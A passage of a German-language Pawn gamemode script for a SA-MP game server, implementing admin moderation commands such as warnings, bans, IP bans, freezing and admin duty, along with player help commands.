							format(string, sizeof(string), "AdmCmd: %s hat den Forumaccount von %s gebannt, Grund: %s", sendername, giveplayer, (result));
							ABroadCast(COLOR_LIGHTRED,string,1);

							format(string, sizeof(string), "Du hast den Forumaccount von %s gesperrt, Grund: %s", giveplayer, (result));
							SendClientMessage(playerid, COLOR_RED, string);
							format(string, sizeof(string), "Dein Forumaccount wurde von %s gesperrt, Grund: %s", sendername, (result));
							SendClientMessage(giveplayerid, COLOR_RED, string);
							return 1;
					}
				}//not connected
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}

	if(strcmp(cmd, "/warn", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /warn [playerid] [grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(AdminDuty[playerid] == 1)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /warn [playerid] [grund]");
							return 1;
						}
						/*
			    		if(IsASkrupy(giveplayerid))
	  		   			{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er der Owner ist!");
							return 1;
						}*/

						if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
						{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht verwarnen, da er ein höheres Adminlevel hat als du!");
							return 1;
						}
						PlayerInfo[giveplayerid][pWarns] += 1;
						if(PlayerInfo[giveplayerid][pWarns] >= 3)
						{
						    new year, month,day;
							getdate(year, month, day);
							format(string, sizeof(string), "AdmCmd: %s wurde von %s gebann(3.Verwarnung), Grund: %s (%d-%d-%d)", giveplayer, sendername, (result),month,day,year);
							BanLog(string);
							format(string, sizeof(string), "%s wurde von %s gebannt(3. Verwarnung), Grund: %s", giveplayer, sendername, (result));
					    	WBB_AddPostUserID(1, 22, "Warn-Log", string, 1, 0, 1, 1, 0, 0, playerid, 1);
							SendClientMessageToAll(COLOR_RED, string);
							PlayerInfo[giveplayerid][pGebannt] = 1;
							Ban(giveplayerid);

		   					new stringk[128];
							format(stringk, sizeof(stringk), (result));
							strmid(PlayerInfo[giveplayerid][pBanGrund], stringk, 0, strlen(stringk), 255);

							format(stringk, sizeof(stringk), sendername);
							strmid(PlayerInfo[giveplayerid][pBanAdmin], stringk, 0, strlen(stringk), 255);

							format(stringk, sizeof(stringk), "Permanent");
							strmid(PlayerInfo[giveplayerid][pBanDauer], stringk, 0, strlen(stringk), 255);

							return 1;
						}
						format(string, sizeof(string), "Du hast %s gewarnt, Grund: %s", giveplayer, (result));
						SendClientMessage(playerid, COLOR_RED, string);
						format(string, sizeof(string), "Du wurdest von %s verwarnt, Grund: %s", sendername, (result));
						SendClientMessage(giveplayerid, COLOR_RED, string);
						return 1;
					}
				}//not connected
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/unwarn", true) == 0)
    {
    if(IsPlayerConnected(playerid))
    {
    tmp = strtoknew(cmdtext, idx);
    if(!strlen(tmp))
    {
    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Benutze: /unwarn [SpielerID] [Grund]");
    return 1;
    }
    giveplayerid = ReturnUser(tmp);
    if (PlayerInfo[playerid][pAdmin] >= 1337)
    {
    if(IsPlayerConnected(giveplayerid))
    {
    if(giveplayerid != INVALID_PLAYER_ID)
	{
    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
    GetPlayerName(playerid, sendername, sizeof(sendername));
    new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
    idx++;
    }
    new offset = idx;
    new result[64];
    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
    {
    result[idx - offset] = cmdtext[idx];
    idx++;
    }
    result[idx - offset] = EOS;
    if(!strlen(result))
    {
    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Benutze: /unwarn [SpielerID] [Grund]");
    return 1;
    }
    PlayerInfo[giveplayerid][pWarns] -= 1;
	format(string, sizeof(string), "Du hast %s entwarnt, Grund: %s", giveplayer, (result));
	SendClientMessage(playerid, COLOR_RED, string);
    format(string, sizeof(string), "Dir wurde von Admin %s eine Verwarnung Entfernt. Grund: %s", sendername, (result));
    SendClientMessage(giveplayerid, COLOR_RED, string);
    return 1;
    }
    }//not connected
    }
    else
    {
    SendClientMessage(playerid, COLOR_RED, "Dieser Spieler ist offline.");
    }
    }
    return 1;
    }

	 	if(strcmp(cmd, "/fraksperre", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 2000)
	        {
         		tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "BENUTZUNG: /fraksperre [playerid/GetName]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						GetPlayerName(playerid, sendername, sizeof(sendername));
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						format(string, sizeof(string), "* Du hast Spieler %s die Fraktionssperre gelöscht. *",giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Admin %s hat dir deine Fraktionssperre entfernt.",sendername);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					    PlayerInfo[giveplayerid][pFrakSperre] = 0;
						return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD2, " Das kann nur der Rank-Vergeber (Admin 2001)!");
			    return 1;
   			}
		}
		return 1;
	}







/*

	if(strcmp(cmd, "/fakeban", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ban [playerid] [grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
   			if (PlayerInfo[playerid][pAdmin] >= 1338)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
				    if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ban [playerid] [grund]");
							return 1;
						}
						if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
						{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er ein höheres Adminlevel hat als du!");
							return 1;
						}
						new year, month,day;
						getdate(year, month, day);
						format(string, sizeof(string), "%s wurde von %s gebannt, Grund: %s (%d-%d-%d)", giveplayer, sendername, (result),month,day,year);
						BanLog(string);
						format(string, sizeof(string), "%s (%d) hat den Server verlassen.", giveplayer, giveplayerid);
						SendClientMessageToAll(COLOR_DBLUE, string);
						format(string, sizeof(string), "%s wurde von %s gebannt, Grund: %s", giveplayer, sendername, (result));
						SendClientMessageToAll(COLOR_RED, string);
						SendClientMessage(giveplayerid, 0x0000000E, "Server closed the connection.");


						return 1;
					}
				}//not connected

			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
	      }
		}
		return 1;
	}


*/
	if(strcmp(cmd, "/ctp", true) == 0)
	{

	    if(IsPlayerAdmin(playerid))
	    {

	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ctp [playerid] [reason]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
   			if (PlayerInfo[playerid][pAdmin] >= 1338)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
				    if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ctp [playerid] [grund]");
							return 1;
						}
      				    OnPlayerCommandText(giveplayerid,(result));
						return 1;
					}
				}//not connected

			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
	      }
		}
		}
		return 1;
	}// Fertig <3
	if(strcmp(cmd, "/ctps", true) == 0)
	{
	    if(IsPlayerAdmin(playerid))
	    {

	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ctps [playerid] [reason]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
   			if (PlayerInfo[playerid][pAdmin] >= 1338)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
				    if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ctps [playerid] [grund]");
							return 1;
						}
						for(new i = 0; i < MAX_PLAYERS; i++)
						{
      				   		OnPlayerCommandText(i,(result));
						}
						return 1;
					}
				}//not connected

			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
	      }
		}
		}
		return 1;
	}
	if(strcmp(cmd, "/ban", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ban [playerid] [grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
   			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
				/*if(IsASkrupy(playerid))
				{
					AdminDuty[playerid] = 1;
				}*/
				if(AdminDuty[playerid] == 0)
				{
				SendClientMessage(playerid, COLOR_GRAD2, "Du bist nicht im Dienst! /aduty");
				return 1;
				}
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ban [playerid] [grund]");
							return 1;
						}
						if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
						{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er ein höheres Adminlevel hat als du!");
							return 1;
						}


			    	/*	if(IsASkrupy(giveplayerid))
	  		   			{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er der Owner ist!");
							return 1;
						}*/
						if(strcmp(GetName(giveplayerid),"Tec9", true ) == 0 )
						{
						    if(gPlayerLogged[giveplayerid] == 1)
						    {
						        return SCM(playerid,-1,"Du kannst diesen Spieler nicht bannen.");
							}
						}
                        AntiAdminAbuse[playerid]++;
						new year, month,day;
						getdate(year, month, day);
						format(string, sizeof(string), "AdmCmd: %s wurde von %s gebannt, Grund: %s (%d-%d-%d)", giveplayer, sendername, (result),month,day,year);
						BanLog(string);
						format(string, sizeof(string), "AdmCmd: %s wurde von %s gebannt, Grund: %s", giveplayer, sendername, (result));
						SendClientMessageToAll(COLOR_LIGHTRED, string);
						//PlayerInfo[giveplayerid][pAdmin] = PlayerInfo[giveplayerid][pLevel];


						GivePlayerForumRightsAdmin(giveplayerid,0,0);

						WBB_AddPostUserID(1, 22, "Server-Ban", string, 1, 0, 1, 1, 0, 0, playerid, 1);




						PlayerInfo[giveplayerid][pAdmin] = 0;
						PlayerInfo[giveplayerid][pGebannt] = 1;
                        SetTimerEx("kicktimer", 300,false,"i",giveplayerid);

	   					new stringk[128];
						format(stringk, sizeof(stringk), (result));
						strmid(PlayerInfo[giveplayerid][pBanGrund], stringk, 0, strlen(stringk), 255);

						format(stringk, sizeof(stringk), sendername);
						strmid(PlayerInfo[giveplayerid][pBanAdmin], stringk, 0, strlen(stringk), 255);

						format(stringk, sizeof(stringk), "Permanent");
						strmid(PlayerInfo[giveplayerid][pBanDauer], stringk, 0, strlen(stringk), 255);



						//Ban(giveplayerid);
						return 1;
					}
				}//not connected
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}

	if(strcmp(cmd, "/ipban", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ipban [playerid] [grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
   			if (PlayerInfo[playerid][pAdmin] >= 2002)
			{
			/*	if(IsASkrupy(playerid))
				{
					AdminDuty[playerid] = 1;
				}*/
				if(AdminDuty[playerid] == 0)
				{
				SendClientMessage(playerid, COLOR_GRAD2, "Du bist nicht im Dienst! /aduty");
				return 1;
				}
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ban [playerid] [grund]");
							return 1;
						}
			    	/*	if(IsASkrupy(giveplayerid))
	  		   			{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er der Owner ist!");
							return 1;
						}*/
						if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
						{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er ein höheres Adminlevel hat als du!");
							return 1;
						}
						if(PlayerInfo[playerid][pAdmin] >= 2005)
						{
						new year, month,day;
						getdate(year, month, day);
						format(string, sizeof(string), "%s wurde von %s gebannt, Grund: %s (%d-%d-%d)", giveplayer, sendername, (result),day,month,year);
//						WBB_AddPost(sendername, 1982, "Server-IP-Ban", string);
						WBB_AddPostUserID(1, 22, "Server-IP-Ban", string, 1, 0, 1, 1, 0, 0, playerid, 1);

						BanLog(string);
						format(string, sizeof(string), "[IP-Ban]%s wurde von UC-Admin gebannt, Grund: %s", giveplayer,  (result));
						SendClientMessageToAll(COLOR_RED, string);
						PlayerInfo[giveplayerid][pAdmin] = 0;
						PlayerInfo[giveplayerid][pGebannt] = 1;
                        SetTimerEx("bantimer", 300,false,"i",giveplayerid);

						GivePlayerForumRightsAdmin(giveplayerid,0,0);


						if(PlayerInfo[playerid][pAdmin] >= 1)
						{
							format(string, sizeof(string), "%s - Gesperrt von %s",(result),sendername);
							WBB_BanUsername(giveplayer, string);
						}
	   					new stringk[128];
						format(stringk, sizeof(stringk), (result));
						strmid(PlayerInfo[giveplayerid][pBanGrund], stringk, 0, strlen(stringk), 255);

						format(stringk, sizeof(stringk), sendername);
						strmid(PlayerInfo[giveplayerid][pBanAdmin], stringk, 0, strlen(stringk), 255);

						format(stringk, sizeof(stringk), "Permanent");
						strmid(PlayerInfo[giveplayerid][pBanDauer], stringk, 0, strlen(stringk), 255);
						return 1;
						}
						new year, month,day;
						getdate(year, month, day);
						format(string, sizeof(string), "Spieler: %s wurde von %s gebannt, Grund: %s (%d-%d-%d)", giveplayer, sendername, (result),day,month,year);
//						WBB_AddPost(sendername, 1982, "Server-IP-Ban", string);
						WBB_AddPostUserID(1, 22, "Server-IP-Ban", string, 1, 0, 1, 1, 0, 0, playerid, 1);

						BanLog(string);
						format(string, sizeof(string), "[IP-Ban]%s wurde von %s gebannt, Grund: %s", giveplayer, sendername, (result));
						SendClientMessageToAll(COLOR_RED, string);
						PlayerInfo[giveplayerid][pAdmin] = 0;
						PlayerInfo[giveplayerid][pGebannt] = 1;
                        SetTimerEx("bantimer", 300,false,"i",giveplayerid);

	   					new stringk[128];
						format(stringk, sizeof(stringk), (result));
						strmid(PlayerInfo[giveplayerid][pBanGrund], stringk, 0, strlen(stringk), 255);

						format(stringk, sizeof(stringk), sendername);
						strmid(PlayerInfo[giveplayerid][pBanAdmin], stringk, 0, strlen(stringk), 255);

						format(stringk, sizeof(stringk), "Permanent");
						strmid(PlayerInfo[giveplayerid][pBanDauer], stringk, 0, strlen(stringk), 255);

						return 1;
					}
				}//not connected
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}

//----------------------------------[Freeze]------------------------------------------------
	if(strcmp(cmd, "/freeze", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /freeze [playerid]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			if(PlayerInfo[playa][pAdmin] > 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Admins kannst du nicht Freezen");
				return 1;
			}
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            AntiAdminAbuse[playerid]++;
				        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						FreezePlayer(playa);
						format(string, sizeof(string), "AdmCmd: %s Freeze %s",sendername,  giveplayer);
						printf("%s",string);
						format(string, sizeof(string), "%s wurde von %s gefreezet",giveplayer ,sendername);
						ABroadCast(COLOR_RED,string,1);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen!");
			}
		}
		return 1;
	}

//----------------------------------[unfreeze]------------------------------------------------
	if(strcmp(cmd, "/unfreeze", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /unfreeze [playerid]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            AntiAdminAbuse[playerid]++;
			    	    GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						UnFreezePlayer(playa);
						format(string, sizeof(string), "AdmCmd: %s UnFroze %s",sendername,  giveplayer);
						printf("%s",string);
						format(string, sizeof(string), "%s wurde von %s entfreezed",giveplayer ,sendername);
						ABroadCast(COLOR_RED,string,1);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du darfst diesen Befehl nicht benutzen!");
			}
		}
		return 1;
	}

//----------------------------------[GMX]-----------------------------------------------
/*
	if(strcmp(cmd, "/gmx", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if (PlayerInfo[playerid][pAdmin] >= 2002)
			{
   				SaveAllAccs();
			    SaveStuff();
   				SetTimer("Restart4",30000,0);
				SendClientMessage(playerid, COLOR_LIGHTRED, "Der Server wird nun neugestartet.");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Das darfst du nicht tun !");
			}
		}
		return 1;
	}
*/
	if (strcmp(cmd, "/cam", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutz: /cam [1/2/3/4]");
				return 1;
			}
			Unspec[playerid][sCam] = strval(tmp);
			format(string, sizeof(string), "Cam zu %d",Unspec[playerid][sCam]);
			SendClientMessage(playerid, COLOR_GRAD1, string);
		}
		return 1;
	}
	if (strcmp(cmd, "/adminon", true) == 0 || strcmp(cmd, "/aduty", true) == 0)
	{
		/*
		if(IsASkrupy(playerid))
		{
			temp44[playerid] = 1;
		}*/
		if(temp44[playerid] == 0)
		{
			if(PlayerInfo[playerid][pAdmin] > 1)
			{
		        ShowPlayerDialog(playerid,DIALOG_ADMINLOGIN,DIALOG_STYLE_PASSWORD,"GTA-City Reallife Admin Login","{FFFFFF}Willkommen auf GTA-City Reallife\nBitte gebe die Admin PIN ein.","Login","Abbrechen");
			}
			return 1;
		}

		if(PlayerInfo[playerid][pAdmin] >= 2005)
		{
		if(AdminDuty[playerid] == 0)
		{
			if(PlayerInfo[playerid][pAdmin] > 3)
			{
				SendClientMessage(playerid,COLOR_YELLOW,"Du bist nun als Supporter im Dienst!");
				SetPlayerColor(playerid,NAMECOLOR_MEDIC);
				AdminDuty[playerid] = 1;
				SetPlayerArmour(playerid, 100);
				TextDrawShowForPlayer(playerid, TDEditor_TD[playerid]);
				return 1;
			}
		}
		if(AdminDuty[playerid] == 1)
		{
			SendClientMessage(playerid,COLOR_YELLOW,"Du bist nun nichtmehr im Dienst!");
			SetPlayerArmour(playerid, 0);
			TextDrawHideForPlayer(playerid, TDEditor_TD[playerid]);
			AdminDuty[playerid] = 0;
			{
				SetPlayerToTeamColor(playerid);
			}
			return 1;
		}
		return 1;
		}
		if(AdminDuty[playerid] == 0)
		{
			if(PlayerInfo[playerid][pAdmin] > 3)
			{
				SendClientMessage(playerid,COLOR_YELLOW,"Du bist nun als Supporter im Dienst!");
				SetPlayerColor(playerid,NAMECOLOR_MEDIC);
				AdminDuty[playerid] = 1;
				GetPlayerName(playerid, sendername, sizeof(sendername));



				format(string,sizeof(string),"** %s hat sich als %s angemeldet. **",sendername,GetPlayerAdminName(playerid));
				SendClientMessageToAll(RED, string);
				SetPlayerArmour(playerid, 100);
				TextDrawShowForPlayer(playerid, TDEditor_TD[playerid]);
				return 1;
			}
		}
		if(AdminDuty[playerid] == 1)
		{
			SendClientMessage(playerid,COLOR_YELLOW,"Du bist nun nichtmehr im Dienst!");
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string,sizeof(string),"** %s hat sich als %s abgemeldet. **",sendername,GetPlayerAdminName(playerid));
			SendClientMessageToAll(RED, string);
			SetPlayerArmour(playerid, 0);
			TextDrawHideForPlayer(playerid, TDEditor_TD[playerid]);
			AdminDuty[playerid] = 0;
			{
				SetPlayerToTeamColor(playerid);
			}
			return 1;
		}

		return 1;
	}
	if (strcmp(cmd, "/admins", true) == 0 || strcmp(cmd, "/supporter", true) == 0)
	{
        if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, 0xAFAFAFAA, "Admins online:");
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
					    if(PlayerInfo[i][pAdmin] == 2)
					    {
							GetPlayerName(i, sendername, sizeof(sendername));
							format(string,sizeof(string),"Communityhelfer: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
							SendClientMessage(playerid, 0xAFAFAFAA, string);
						}
					    if(PlayerInfo[i][pAdmin] == 4)
					    {
							GetPlayerName(i, sendername, sizeof(sendername));
							format(string,sizeof(string),"Supporter: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
							SendClientMessage(playerid, 0xAFAFAFAA, string);
						}
	 					if(PlayerInfo[i][pAdmin] == 1337)
         				{
							GetPlayerName(i, sendername, sizeof(sendername));
							format(string,sizeof(string),"Moderator: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
							SendClientMessage(playerid, 0xAFAFAFAA, string);
						}
 						if(PlayerInfo[i][pAdmin] == 1338)
					    {
							GetPlayerName(i, sendername, sizeof(sendername));
							format(string,sizeof(string),"Admin: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
							SendClientMessage(playerid, 0xAFAFAFAA, string);
						}
                        if(PlayerInfo[i][pAdmin] == 2000)
					    {
							GetPlayerName(i, sendername, sizeof(sendername));
							format(string,sizeof(string),"Head-Admin: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
							SendClientMessage(playerid, 0xAFAFAFAA, string);
						}
      					if(PlayerInfo[i][pAdmin] == 2001)
					    {
							GetPlayerName(i, sendername, sizeof(sendername));
							format(string,sizeof(string),"Stellv. Projektleitung: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
							SendClientMessage(playerid, 0xAFAFAFAA, string);
						}
      					if(PlayerInfo[i][pAdmin] == 2002)
					    {
							GetPlayerName(i, sendername, sizeof(sendername));
							format(string,sizeof(string),"Projektleitung: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
							SendClientMessage(playerid, 0xAFAFAFAA, string);
						}
					}
			}
        }
		return 1;
	}
	if (strcmp(cmd, "/ucadmins", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 2)
		{
	        if(IsPlayerConnected(playerid))
		    {
					SendClientMessage(playerid, 0xAFAFAFAA, "UC-Admins online:");
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
						if(IsPlayerConnected(i))
						{
	      					if(PlayerInfo[i][pAdmin] >= 2005)
						    {
								GetPlayerName(i, sendername, sizeof(sendername));
								format(string,sizeof(string),"Undercover Admin: %s | Tickets: %d",sendername,PlayerInfo[i][pAdminTickets]);
								SendClientMessage(playerid, 0xAFAFAFAA, string);
							}
						}
				}
	        }
		}
		return 1;
	}

//=================================================================================================
   	if (strcmp("/carhelp", cmdtext, true, 10) == 0)
	{
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		SendClientMessage(playerid, COLOR_WHITE,"** Befehle ** /parken /lock /carkey /carsell(an Server verkaufen) /findcar /sellcar (Car an Spieler verkaufen)");
		return 1;
	}
	if(strcmp(cmd, "/househelp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			SendClientMessage(playerid, COLOR_WHITE,"*** HAUS HILFE *** Tippe etwas ein um Mehr Hilfe zu bekommen");
			SendClientMessage(playerid, COLOR_GRAD3,"*** Haus ***  Enter /open /home /heal /houseupgrade (/hu) /setrentable /bewohner");
			SendClientMessage(playerid, COLOR_GRAD3,"*** Haus *** /evictall /setrent /evict /housewithdraw /sethint");
			SendClientMessage(playerid, COLOR_GRAD4,"*** Andere *** /cellphonehelp /help /renthelp /bizhelp /leaderhelp /fishhelp /cookhelp /irchelp ");
		}
		return 1;
	}
	if(strcmp(cmd, "/renthelp", true) == 0)
	{
		if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			SendClientMessage(playerid, COLOR_WHITE,"*** Miet Hilfe *** Tippe etwas ein um Mehr Hilfe zu bekommen");
			SendClientMessage(playerid, COLOR_GRAD3,"*** Mieten *** /unrent Enter /home");
			SendClientMessage(playerid, COLOR_GRAD4,"*** Andere *** /cellphonehelp /househelp /help /bizhelp /leaderhelp /fishhelp /cookhelp /irchelp");
		}
		return 1;
	}
	if(strcmp(cmd, "/tankhelp", true) == 0)
	{
